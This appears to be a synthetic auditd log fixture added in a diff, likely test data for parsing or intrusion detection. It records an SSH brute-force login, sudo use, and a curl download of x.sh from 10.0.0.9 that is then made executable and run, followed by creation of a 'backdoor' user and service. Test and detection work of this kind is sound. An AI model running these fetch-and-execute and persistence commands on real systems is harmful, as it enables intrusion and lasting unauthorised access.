@@ -1,0 +1,48 @@
+type=USER_AUTH msg=audit(1700000100.100:451): pid=901 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=? acct="alice" exe="/usr/sbin/sshd" hostname=? addr=10.0.0.5 terminal=ssh res=failed'
+type=USER_AUTH msg=audit(1700000102.200:452): pid=901 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=? acct="alice" exe="/usr/sbin/sshd" hostname=? addr=10.0.0.5 terminal=ssh res=failed'
+type=USER_AUTH msg=audit(1700000104.300:453): pid=901 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=? acct="alice" exe="/usr/sbin/sshd" hostname=? addr=10.0.0.5 terminal=ssh res=failed'
+type=USER_AUTH msg=audit(1700000106.400:454): pid=901 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=? acct="alice" exe="/usr/sbin/sshd" hostname=? addr=10.0.0.5 terminal=ssh res=failed'
+type=USER_AUTH msg=audit(1700000108.500:455): pid=901 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=? acct="alice" exe="/usr/sbin/sshd" hostname=? addr=10.0.0.5 terminal=ssh res=failed'
+type=USER_AUTH msg=audit(1700000112.600:456): pid=905 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=pam_unix acct="alice" exe="/usr/sbin/sshd" hostname=? addr=10.0.0.5 terminal=ssh res=success'
+type=USER_ACCT msg=audit(1700000112.601:457): pid=905 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:accounting grantors=pam_unix acct="alice" exe="/usr/sbin/sshd" hostname=? addr=10.0.0.5 terminal=ssh res=success'
+type=USER_LOGIN msg=audit(1700000112.650:458): pid=905 uid=0 auid=1000 ses=3 msg='op=login acct="alice" exe="/usr/sbin/sshd" hostname=10.0.0.5 addr=10.0.0.5 terminal=ssh res=success'
+corrupted audit line missing header and timestamp
+type=USER_CMD msg=audit(1700000120.100:460): pid=1100 uid=1000 auid=1000 ses=3 msg='cwd="/home/alice" cmd=2F7573722F62696E2F6964 exe="/usr/bin/sudo" terminal=pts/0 res=success'UID="alice" AUID="alice"
+type=SYSCALL msg=audit(1700000125.050:461): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffd1234 a2=0 a3=0 items=1 ppid=1100 pid=1101 auid=1000 uid=0 gid=0 euid=0 tty=pts0 ses=3 comm="id" exe="/usr/bin/id" key=(null)
+type=CWD msg=audit(1700000125.050:461): cwd="/home/alice"
+type=PATH msg=audit(1700000125.050:461): item=0 name="/etc/passwd" inode=12345 dev=08:01 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=EOE msg=audit(1700000125.050:461):
+type=SYSCALL msg=audit(1700000130.100:462): arch=c000003e syscall=59 success=yes exit=0 a0=55a10000 a1=55a10010 a2=55a10020 a3=0 items=2 ppid=1100 pid=1234 auid=1000 uid=0 gid=0 euid=0 tty=pts0 ses=3 comm="curl" exe="/usr/bin/curl" key="exec"
+type=SYSCALL msg=audit(1700000130.105:463): arch=c000003e syscall=59 success=yes exit=0 a0=55b20000 a1=55b20010 a2=55b20020 a3=0 items=2 ppid=1100 pid=1235 auid=1000 uid=0 gid=0 euid=0 tty=pts0 ses=3 comm="chmod" exe="/usr/bin/chmod" key="exec"
+type=EXECVE msg=audit(1700000130.100:462): argc=5 a0="curl" a1="-s" a2="http://10.0.0.9/x.sh" a3="-o" a4="/tmp/x.sh"
+type=EXECVE msg=audit(1700000130.105:463): argc=3 a0="chmod" a1="+x" a2="/tmp/x.sh"
+type=CWD msg=audit(1700000130.100:462): cwd="/tmp"
+type=PATH msg=audit(1700000130.100:462): item=0 name="/usr/bin/curl" inode=101 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1700000130.100:462): item=1 name="/lib64/ld-linux-x86-64.so.2" inode=102 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PROCTITLE msg=audit(1700000130.100:462): proctitle=6375726C002D7300687474703A2F2F31302E302E302E392F782E7368002D6F002F746D702F782E7368
+type=CWD msg=audit(1700000130.105:463): cwd="/tmp"
+type=PATH msg=audit(1700000130.105:463): item=0 name="/usr/bin/chmod" inode=103 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PROCTITLE msg=audit(1700000130.105:463): proctitle=63686D6F64002B78002F746D702F782E7368
+type=EOE msg=audit(1700000130.100:462):
+type=EOE msg=audit(1700000130.105:463):
+type=SYSCALL msg=audit(1700000135.250:464): arch=c000003e syscall=59 success=yes exit=0 a0=55c30000 a1=55c30010 a2=55c30020 a3=0 items=2 ppid=1100 pid=1240 auid=1000 uid=0 gid=0 euid=0 tty=pts0 ses=3 comm="bash" exe="/bin/bash" key="exec"
+type=EXECVE msg=audit(1700000135.250:464): argc=3 a0="/bin/bash" a1="/tmp/x.sh" a2=736563726574207061796C6F6164
+type=CWD msg=audit(1700000135.250:464): cwd="/tmp"
+type=PATH msg=audit(1700000135.250:464): item=0 name="/bin/bash" inode=104 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1700000135.250:464): item=1 name="/tmp/x.sh" inode=105 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PROCTITLE msg=audit(1700000135.250:464): proctitle=2F62696E2F62617368002F746D702F782E736800736563726574207061796C6F6164
+type=EOE msg=audit(1700000135.250:464):
+type=SYSCALL msg=audit(1700000140.100:465): arch=c000003e syscall=59 success=yes exit=0 a0=55d40000 a1=55d40010 a2=55d40020 a3=0 items=2 ppid=1100 pid=1300 auid=1000 uid=0 gid=0 euid=0 tty=pts0 ses=3 comm="useradd" exe="/usr/sbin/useradd" key="exec"
+type=EXECVE msg=audit(1700000140.100:465): argc=3 a0="/usr/sbin/useradd" a1="-m" a2="backdoor"
+type=CWD msg=audit(1700000140.100:465): cwd="/tmp"
+type=PATH msg=audit(1700000140.100:465): item=0 name="/usr/sbin/useradd" inode=106 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PROCTITLE msg=audit(1700000140.100:465): proctitle=2F7573722F7362696E2F75736572616464002D6D006261636B646F6F72
+type=EOE msg=audit(1700000140.100:465):
+type=ADD_USER msg=audit(1700000140.200:466): pid=1300 uid=0 auid=1000 ses=3 msg='op=adding user acct="backdoor" exe="/usr/sbin/useradd" hostname=? addr=? terminal=pts/0 res=success'
+type=SYSCALL msg=audit(1700000150.050:467): arch=c000003e syscall=59 success=yes exit=0 a0=55e50000 a1=55e50010 a2=55e50020 a3=0 items=2 ppid=1100 pid=1350 auid=1000 uid=0 gid=0 euid=0 tty=pts0 ses=3 comm="systemctl" exe="/usr/bin/systemctl" key="exec"
+type=EXECVE msg=audit(1700000150.050:467): argc=3 a0="/usr/bin/systemctl" a1="start" a2="backdoor.service"
+type=CWD msg=audit(1700000150.050:467): cwd="/tmp"
+type=PATH msg=audit(1700000150.050:467): item=0 name="/usr/bin/systemctl" inode=107 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PROCTITLE msg=audit(1700000150.050:467): proctitle=2F7573722F62696E2F73797374656D63746C007374617274006261636B646F6F722E73657276696365
+type=EOE msg=audit(1700000150.050:467):
+type=SERVICE_START msg=audit(1700000150.100:468): pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=backdoor.service comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
